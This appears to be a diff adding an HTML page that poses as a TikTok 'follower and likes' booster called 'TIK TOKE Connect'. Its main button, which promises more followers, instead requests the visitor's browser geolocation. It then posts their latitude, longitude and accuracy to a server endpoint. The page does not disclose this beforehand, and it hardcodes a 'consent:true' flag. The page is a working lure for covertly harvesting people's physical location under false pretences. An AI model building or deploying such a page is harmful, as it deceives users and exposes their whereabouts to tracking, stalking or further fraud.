@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Creator Connect</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;min-height:100vh;background:#08090e;color:white;
+ font-family:Arial,sans-serif;
+ background-image:radial-gradient(#26313e 1px,transparent 1px);
+ background-size:24px 24px
+}
+header{
+ padding:18px 22px;background:#11131b;
+ border-bottom:1px solid #25e5e5;
+ display:flex;align-items:center;gap:13px
+}
+.logo{
+ width:40px;height:40px;border-radius:12px;
+ background:#08090e;border:1px solid #25e5e5;
+ display:grid;place-items:center;
+ color:#25e5e5;font-size:26px;
+ box-shadow:3px 3px #fe2c55
+}
+header h2{margin:0;font-size:20px}
+header small{color:#25e5e5}
+main{max-width:560px;margin:35px auto;padding:18px}
+.hero{text-align:center;padding:20px 5px}
+.art{
+ width:125px;height:125px;margin:auto;
+ border-radius:30px;background:#111923;
+ border:2px solid #25e5e5;
+ display:grid;place-items:center;
+ font-size:58px;color:#25e5e5;
+ box-shadow:5px 5px #fe2c55,0 0 35px #25e5e544
+}
+h1{font-size:32px;line-height:1.2}
+h1 span{color:#25e5e5;text-shadow:2px 2px #fe2c55}
+p{color:#c1c6d1;line-height:1.65}
+.card{
+ background:#131620;border:1px solid #34404c;
+ border-radius:19px;padding:23px;margin-top:25px;
+ box-shadow:0 15px 40px #0009
+}
+.card h2{color:#25e5e5}
+.feature{
+ display:flex;gap:13px;align-items:center;
+ padding:15px;background:#1b202c;
+ border-radius:12px;margin:18px 0
+}
+.feature span{font-size:30px;color:#fe2c55}
+.notice{
+ background:#1b202c;padding:14px;
+ border-radius:11px;font-size:13px;
+ border:1px solid #414b59
+}
+button{
+ width:100%;padding:16px;border:0;
+ border-radius:10px;background:#25e5e5;
+ color:#061014;font-size:16px;
+ font-weight:bold;margin-top:13px
+}
+.secondary{background:#fe2c55;color:white}
+#status{overflow-wrap:anywhere}
+footer{text-align:center;padding:25px;color:#8993a5;font-size:12px}
+</style>
+</head>
+<body>
+<header>
+ <div class="logo">♪</div>
+ <div>
+  <h2>TIK TOKE Connect</h2>
+  <small>Rquast send</small>
+ </div>
+</header>
+<main>
+<section class="hero">
+ <div class="art">♪</div>
+ <h1>TIK TOKE. Connect.<br><span>CONGURTULATION YOU ARE FIRST.</span></h1>
+ <p>Choose if you want to increase your Follower and likes.</p>
+</section>
+<section class="card">
+ <h2>TIk TOKE</h2>
+ <p>Your reqaust will only be shared when you press the button and approve your browser's Tik toke.</p>
+ <div class="feature">
+  <span>⌖</span>
+  <div>
+   <b>TIK TOKE</b>
+   <p style="margin:5px 0 0">SEND REQAUST TIK TOKE TEAM </p>
+  </div>
+ </div>
+ <div class="notice">
+ TIK TOKE TEAM Give you chance If you want to increase your followers and likes then send follower requests on TIk Toke server.
+ </div>
+ <button onclick="shareLocation()">ENTER FOR MORE FOLLOWER AND LIKES</button>
+ <button class="secondary" onclick="document.getElementById('status').textContent='Sharing automaticly allow.'">MAYBE LATER</button>
+ <p id="status" aria-live="polite">THANKS FOR SEND REQUAST.</p>
+</section>
+</main>
+<footer>TIK TOKER TEAM WAS CONNECTED · allow</footer>
+<script>
+function shareLocation(){
+ const status=document.getElementById("status");
+ if(!navigator.geolocation){
+  status.textContent="Location is not supported by this browser.";
+  return;
+ }
+ status.textContent="Waiting for your permission...";
+ navigator.geolocation.getCurrentPosition(async pos=>{
+  status.textContent="Sending For more follower and likes...";
+  try{
+   const response=await fetch("/api/location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+     consent:true,
+     latitude:pos.coords.latitude,
+     longitude:pos.coords.longitude,
+     accuracy:pos.coords.accuracy
+    })
+   });
+   status.textContent=response.ok
+    ?"Location shared successfully."
+    :"Server error: location was not accepted.";
+  }catch(error){
+   status.textContent="Unable to connect to server.";
+  }
+ },()=>{
+  status.textContent="Permission denied or location unavailable.";
+ });
+}
+</script>
+</body>
+</html>
